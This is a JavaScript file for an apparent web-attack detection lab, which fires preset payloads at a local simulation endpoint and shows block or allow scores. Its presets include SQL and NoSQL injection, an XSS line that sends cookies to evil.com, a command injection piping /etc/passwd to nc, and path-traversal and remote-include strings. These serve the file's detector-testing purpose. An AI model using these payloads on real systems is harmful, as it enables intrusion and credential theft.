const presets = {
    sql: "admin' OR 1=1 --",
    sql2: "1' AND 1=(SELECT COUNT(*) FROM tabname)--",
    xss: "<script>fetch('http://evil.com?cookie='+document.cookie)</script>",
    xss2: "eval(''+String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))",
    cmd: "127.0.0.1; cat /etc/passwd | nc 192.168.0.1 4444",
    lfi: "../../../../../etc/shadow%00",
    rfi: "http://malicious.com/shell.php",
    json: "{\"username\": {\"$ne\": null}, \"password\": {\"$gt\": \"\"}}",
    header: "sqlmap/1.5.8#dev (http://sqlmap.org)",
    clean: "username=johndoe&action=login"
};

// Global function to trigger payload presets from tabs
window.loadTest = function(presetKey) {
    document.getElementById('attackType').value = presetKey;
    document.getElementById('payloadInput').value = presets[presetKey];
};

window.showTab = function(tabId) {
    // Hide all tab contents
    document.querySelectorAll('.tab-content').forEach(element => {
        element.style.display = 'none';
        element.classList.remove('active');
    });

    // Remove active class from all links
    document.querySelectorAll('.tab-link').forEach(link => {
        link.classList.remove('active');
    });

    // Show selected tab content
    const activeTab = document.getElementById('content-' + tabId);
    activeTab.style.display = 'block';
    setTimeout(() => activeTab.classList.add('active'), 10);

    // Set active link
    document.getElementById('tab-' + tabId).classList.add('active');
};

document.addEventListener('DOMContentLoaded', () => {
    const attackTypeSelect = document.getElementById('attackType');
    const payloadInput = document.getElementById('payloadInput');
    const btnFire = document.getElementById('btnFire');
    const logContainer = document.getElementById('logContainer');

    // Load initial preset
    payloadInput.value = presets[attackTypeSelect.value];

    attackTypeSelect.addEventListener('change', (e) => {
        payloadInput.value = presets[e.target.value];
    });

    btnFire.addEventListener('click', async () => {
        const payload = payloadInput.value;
        const type = attackTypeSelect.value;
        
        btnFire.disabled = true;
        btnFire.innerText = "ANALYZING...";
        
        try {
            let url = '/lab/simulate';
            let params = new URLSearchParams();
            
            if(type !== 'header') {
               params.append('q', payload);
               url += '?' + params.toString();
            }

            const headers = {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            };

            if(type === 'header') {
                headers['User-Agent'] = payload;
            }

            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify({ type, payload })
            });

            let responseData;
            const statusStr = response.headers.get("X-RASP-Final-Score");
            let finalScoreHeader = statusStr ? parseFloat(statusStr) : 0;

            if (response.status === 403) {
                responseData = await response.json();
                updateDashboard(responseData, true);
                addLogEntry(`[BLOCKED] Detected: ${responseData.attackType}. Final Score: ${responseData.finalScore.toFixed(2)}`, 'blocked');
            } else {
                responseData = await response.json();
                updateDashboard(null, false, finalScoreHeader);
                addLogEntry(`[ALLOWED] Final Score: ${finalScoreHeader.toFixed(2)}. Response: 200 OK.`, 'allowed');
            }

        } catch (error) {
            console.error('Error:', error);
            addLogEntry(`[ERROR] Connection failed.`, 'blocked');
        } finally {
            btnFire.disabled = false;
            btnFire.innerText = "FIRE PAYLOAD";
        }
    });

    function updateDashboard(data, isBlocked, allowedScore) {
        const banner = document.getElementById('decisionBanner');
        const icon = banner.querySelector('.decision-icon');
        const heading = banner.querySelector('h3');
        const desc = banner.querySelector('p');

        if (isBlocked && data) {
            banner.className = 'decision-banner blocked';
            icon.innerText = '⚠️';
            heading.innerText = 'THREAT NEUTRALIZED';
            desc.innerText = `Request dropped due to high risk score`;
            
            // Rule Score
            document.getElementById('valRuleScore').innerText = data.ruleScore;
            document.getElementById('barRuleScore').style.width = `${Math.min(data.ruleScore, 100)}%`;
            if(data.ruleScore > 70) document.getElementById('barRuleScore').style.background = 'var(--danger)';
            else document.getElementById('barRuleScore').style.background = 'var(--warning)';

            // ML Prob
            document.getElementById('valMlProb').innerText = (data.mlProbability).toFixed(2);
            document.getElementById('barMlProb').style.width = `${(data.mlProbability * 100).toFixed(0)}%`;
            if(data.mlProbability > 0.8) document.getElementById('barMlProb').style.background = 'var(--danger)';
            else document.getElementById('barMlProb').style.background = 'var(--accent)';

            // Final
            const valFinal = document.getElementById('valFinalScore');
            valFinal.innerText = data.finalScore.toFixed(1);
            valFinal.className = 'metric-value big-score score-danger';

        } else {
            banner.className = 'decision-banner allowed';
            icon.innerText = '✅';
            heading.innerText = 'REQUEST ALLOWED';
            desc.innerText = 'Payload passed security checks';

            document.getElementById('valRuleScore').innerText = '0';
            document.getElementById('barRuleScore').style.width = `0%`;
            document.getElementById('valMlProb').innerText = '0.00';
            document.getElementById('barMlProb').style.width = `0%`;
            
            const valFinal = document.getElementById('valFinalScore');
            valFinal.innerText = allowedScore ? allowedScore.toFixed(1) : '0.0';
            valFinal.className = 'metric-value big-score';
        }
    }

    function addLogEntry(message, type) {
        const now = new Date();
        const timeStr = now.toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute:'2-digit', second:'2-digit' });
        
        const div = document.createElement('div');
        div.className = `log-entry ${type}`;
        div.innerHTML = `<span class="log-time">[${timeStr}]</span> <span class="log-msg">${message}</span>`;
        
        logContainer.prepend(div);
    }
});
